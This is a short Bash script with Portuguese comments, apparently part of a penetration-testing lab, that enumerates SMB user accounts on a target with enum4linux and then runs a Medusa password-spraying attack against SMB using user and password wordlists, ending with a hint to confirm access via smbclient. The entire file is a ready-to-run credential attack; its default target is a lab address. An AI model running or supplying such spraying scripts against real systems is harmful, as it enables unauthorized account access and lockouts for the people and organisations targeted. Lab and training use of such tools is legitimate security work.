#!/bin/bash
# Enumeração SMB e password spraying via Medusa
# Uso: ./02_smb_enumeration.sh <IP_ALVO>

ALVO=${1:-"192.168.56.101"}
USUARIOS="../wordlists/usuarios.txt"
SENHAS="../wordlists/senhas.txt"

echo "[*] Enumerando usuários SMB em $ALVO"
echo ""
enum4linux -U "$ALVO" 2>/dev/null | grep "user:" | awk '{print $2}' | tr -d '[]'

echo ""
echo "[*] Iniciando password spraying SMB em $ALVO"
echo ""

medusa -h "$ALVO" \
       -U "$USUARIOS" \
       -P "$SENHAS" \
       -M smbnt \
       -t 2 \
       -f \
       -v 6

echo ""
echo "[*] Validar acesso encontrado:"
echo "    smbclient //$ALVO/tmp -U <usuario>"
